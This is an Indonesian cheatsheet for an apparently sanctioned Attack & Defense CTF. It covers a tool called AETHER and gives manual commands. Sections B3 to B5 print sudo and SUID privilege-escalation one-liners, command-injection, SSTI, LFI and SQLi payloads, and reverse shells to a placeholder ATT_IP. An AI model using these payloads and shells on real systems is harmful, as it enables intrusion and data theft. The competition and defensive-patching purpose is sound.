# AETHER A&D — Cheatsheet

Perintah cepat untuk kompetisi Attack & Defense **resmi** (flag `IONIC{...}`). Dua bagian:
**(A) AETHER** (otomatis) dan **(B) manual** (bagian yang AETHER sengaja tidak otomatiskan —
di sinilah pengalaman B2R kalian jalan). Semua ini untuk service yang **diizinkan** di scope.

> Prinsip: AETHER menemukan & membaca flag, **kamu yang submit**. Semua probe read-only,
> scope fail-closed. Lihat **[STRATEGY.md](STRATEGY.md)** untuk kapan memakai apa.

---

# A. AETHER (otomatis)

### Setup (sekali)
```bash
uv tool install --editable .          # perintah `aether` global
aether system health                  # harus hijau, "No-AI runtime: clean"
aether web                            # DASHBOARD browser (URL ber-token) — pusat kendali
```

### Scope (kritis — isi saat briefing)
```bash
aether init                           # tulis config/aether.yaml dari contoh
aether config validate                # WAJIB "READY" sebelum diandalkan
aether scope show                     # lihat allowlist (lawan merah)
# atau isi dari dashboard: tab Config → Scope builder → Save scope
```
Format target di `config/aether.yaml`:
```yaml
scope:
  enforce: true                       # JANGAN false saat lomba
  targets:
    - {name: enemy1, host: 10.1.2.3, ports: [80, 8080], kind: web, owner: opponent}
    - {name: ours,   host: 127.0.0.1, ports: [80], kind: web, owner: self, notes: /var/www/html}
flags:  {pattern: 'IONIC\{[^}]+\}', auto_submit: false}
scoring: {tick_seconds: 120}
```

### Attack
```bash
aether attack status                        # modul + target lawan
aether attack sweep <ip>                     # arsenal penuh: recon + login + baca flag server
aether attack sweep                          # tanpa host = semua lawan in-scope
aether attack sweep <ip> --cred admin:pass   # tambah kredensial diketahui (boleh berulang)
aether attack sweep <ip> --no-login          # lewati auto-login
aether attack sweep <ip> --no-recon          # lewati crawl (wordlist buta)
aether attack loop --interval 120            # TIAP RONDE (flag berputar) — exploit farm aktif
aether attack stop                           # stop rapi di ronde berikutnya
aether attack privesc <ip>                   # enumerasi priv-esc read-only (id/sudo -l/SUID/caps)
```

### Flags (kamu yang submit)
```bash
aether flags inbox                           # PENDING, nilai ter-mask
aether flags inbox --show-values             # reveal saat mau submit
aether flags copy <prefix> | xclip -selection clipboard
# submit di PORTAL resmi, lalu:
aether flags mark-submitted <prefix> --status SUBMITTED
aether flags mark-submitted <prefix> --status ACCEPTED
```
Legend validasi: **VALIDATED** (cocok pattern — submit ini), **UNVERIFIED** (pattern belum
di-set), **INVALID**, **DUPLICATE**.

### Defense
```bash
aether defense status
aether monitor dashboard --interval 5        # LIVE: health, integrity, incidents, web shell
aether monitor start --interval 10           # loop teks (ringan, scriptable)
aether monitor stop
aether defense webshells                      # scan web-root sendiri (READ-ONLY)
aether defense webshells --path /var/www      # scan direktori tertentu
aether defense quarantine /var/www/html/uploads/shell.php   # backup→pindah→tes→verify (reversible)
```

### Dashboard (semua di atas, dari browser)
`aether web` → tab **Monitor** (health + web shell + quarantine 1 klik), **Attack** (sweep +
panel progress live), **Flags** (reveal/mark), **Config** (scope builder + YAML), **Game plan**.

### Sanity check
```bash
aether lab test            # pipeline penuh vs lab lokal
pytest                     # test suite
```

---

# B. Manual (yang AETHER tidak otomatiskan)

> Dipakai setelah AETHER memberi pijakan/enumerasi. Jalankan dari shell yang kalian dapat di
> target yang **diizinkan**.

## B1. Baca flag (kalau perlu manual)
```bash
grep -rsoaE 'IONIC\{[^}]+\}' / 2>/dev/null          # cari flag di seluruh FS (terbatas waktu)
cat /root/root.txt /home/*/user.txt /flag* 2>/dev/null
find / -name '*.txt' -newermt '-10 min' 2>/dev/null  # file baru (flag ronde ini)
env | grep -i ionic                                  # kadang di env var
```

## B2. Enumerasi pijakan (orientasi cepat)
```bash
id; whoami; hostname; uname -a
sudo -n -l 2>/dev/null                 # bisa sudo tanpa password?
find / -perm -4000 -type f 2>/dev/null # SUID
find / -perm -2000 -type f 2>/dev/null # SGID
getcap -r / 2>/dev/null                # capabilities
cat /etc/crontab; ls -la /etc/cron.*   # cron (sering jalan sebagai root)
ls -la /; ls -la /home /var/www /opt    # cari yang aneh
ps aux --forest; netstat -tlnp 2>/dev/null || ss -tlnp
```
Tip: jalankan **LinPEAS** kalau boleh bawa tool sendiri — lebih lengkap dari enumerasi manual.

## B3. Priv-esc (eksekusi — AETHER cuma enumerasi)
```bash
# sudo NOPASSWD → cek GTFOBins untuk binary-nya. Contoh:
sudo /usr/bin/find . -exec /bin/sh \; -quit     # kalau find boleh sudo
sudo /usr/bin/vim -c ':!/bin/sh'                 # kalau vim boleh sudo
# SUID → GTFOBins. Contoh:
/usr/bin/find . -exec /bin/sh -p \; -quit        # find SUID
# capability cap_setuid:
./python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'   # jika python punya cap_setuid
# cron root menulis script writable → sisipkan perintah di script itu.
```
> Selalu rujuk **GTFOBins** (gtfobins.github.io) untuk biner spesifik. Jangan tebak-tebak di
> service produksi lawan — baca dulu apa yang binary itu lakukan.

## B4. Payload web (kalau mau manual / tuning)
```text
# Command injection (coba separator):
;id    |id    &&id    `id`    $(id)    %0aid
;grep -rsoaE 'IONIC\{[^}]+\}' / 2>/dev/null

# SSTI deteksi: {{7*7}} -> 49 ? lalu:
{{''.__class__.__mro__[1].__subclasses__()}}                 # Python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}  # Jinja2

# Path traversal / LFI:
../../../../etc/passwd        ....//....//etc/passwd        /etc/passwd%00
php://filter/convert.base64-encode/resource=index.php        # baca source PHP

# SQLi cepat:
' OR '1'='1    ' UNION SELECT NULL--    ' OR SLEEP(5)--    admin'--
# dump pakai sqlmap kalau boleh:  sqlmap -u 'http://ip/p?id=1' --batch --dump
```

## B5. Shell & transfer (lingkungan lomba)
```bash
# reverse shell (ganti IP/port kalian; set listener dulu: nc -lvnp 4444)
bash -i >& /dev/tcp/ATT_IP/4444 0>&1
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATT_IP",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
# upgrade TTY:
python3 -c 'import pty;pty.spawn("/bin/bash")'   # lalu Ctrl-Z; stty raw -echo; fg; export TERM=xterm
# transfer file:
python3 -m http.server 8000           # di penyerang;  di target: curl http://ATT_IP:8000/x -o x
```

## B6. Patch & hardening service SENDIRI (defense)
> Tujuan: tutup bug **tanpa** mematikan service (SLA!). Backup dulu (AETHER `patch`/`quarantine`
> otomatis backup + rollback). Prinsip: perbaiki akar, bukan sembunyikan.

```bash
# BACKUP dulu selalu:
cp -a /var/www/html /root/backup-www-$(date +%s)
cp -a <flag-store> /root/backup-flags-$(date +%s)

# Web shell ketemu → quarantine (reversible) lewat AETHER:
aether defense quarantine /var/www/html/uploads/evil.php

# Tutup bug umum (contoh, sesuaikan service):
#  - command injection: hapus pemanggilan system()/exec() atas input; whitelist argumen.
#  - upload shell: tolak ekstensi skrip, taruh uploads di luar web-root / 'php_flag engine off'.
#  - path traversal: realpath() + pastikan di dalam direktori yang diizinkan.
#  - SQLi: pakai prepared statement/parameter.
#  - default creds: ganti password admin SEGERA.
#  - file ke-expose: hapus .git/backup/flag dari web-root.

# Pantau integritas:
find /var/www/html -newermt '-5 min' -type f 2>/dev/null    # file berubah baru-baru ini
# Setelah patch: pastikan service MASIH jalan (functional)!
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1/
```

## B7. Jangan lakukan
- ❌ Mematikan / `systemctl stop` service kalian (SLA hilang).
- ❌ Menghapus flag store / mengubah perilaku service yang dicek panitia.
- ❌ Patch sampai functional test gagal (AETHER rollback, tapi buang waktu).
- ❌ Serangan destruktif / DoS ke lawan (biasanya dilarang & diskualifikasi).
- ❌ Submit flag palsu (AETHER tidak auto-submit justru untuk mencegah ini).

---

## Rujukan cepat eksternal (buka sebelum lomba)
- **GTFOBins** — priv-esc per biner (SUID/sudo).
- **PayloadsAllTheThings** — payload web lengkap.
- **HackTricks** — metodologi enumerasi/priv-esc Linux.
- **LinPEAS/pspy** — tool enumerasi & monitor proses (bawa sendiri jika diizinkan).

Alur operasional penuh: **[RUNBOOK.md](RUNBOOK.md)**. Strategi tim: **[STRATEGY.md](STRATEGY.md)**.
